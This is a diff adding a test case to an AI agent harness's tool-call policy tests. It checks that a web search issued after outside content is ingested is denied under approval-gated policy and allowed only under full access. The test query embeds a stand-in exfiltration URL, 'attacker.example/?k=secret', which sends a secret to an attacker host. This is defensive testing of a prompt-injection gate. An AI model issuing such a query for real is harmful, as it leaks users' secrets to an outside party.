@@ -493,6 +493,23 @@ describe("resolveToolCall fail-closed order", () => {
     expect(search("forecast https://attacker.example/?k=secret", true, "full-access").kind).toBe(
       "allow",
     );
+    // The person turns the refusal down with the outside-content gate, by
+    // choosing Full access, in Work as in Code; below it the refusal holds.
+    const workSearch = (executionPolicy: "approval-gated" | "full-access") =>
+      resolveToolCall(
+        baseInput({
+          mode: "work",
+          capability: decodeToolActionCapability({ id: "harness-web-search", version: 1 }),
+          arguments: { query: "forecast https://attacker.example/?k=secret" },
+          thread: {
+            executionPolicy,
+            approvalSatisfied: executionPolicy === "full-access",
+            externalContentIngested: true,
+          },
+        }),
+      ).kind;
+    expect(workSearch("approval-gated")).toBe("deny");
+    expect(workSearch("full-access")).toBe("allow");
   });
 
   it("7b. auto-accept edits waives only project file writes", () => {
